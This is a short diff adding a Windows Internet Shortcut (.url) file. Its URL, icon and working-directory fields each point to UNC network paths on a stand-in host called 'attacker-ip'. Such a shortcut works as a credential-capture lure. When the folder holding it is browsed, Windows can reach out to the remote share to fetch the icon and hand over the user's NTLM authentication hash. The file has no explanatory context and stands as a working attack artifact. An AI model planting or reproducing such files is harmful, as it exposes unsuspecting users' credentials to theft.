@@ -1,0 +1,7 @@
+[InternetShortcut]
+URL=\\attacker-ip\public
+HotKey=0
+IconFile=\\attacker-ip\icons\shortcut.ico
+IconIndex=1
+WorkingDirectory=\\attacker-ip\temp
+ShowCommand=1
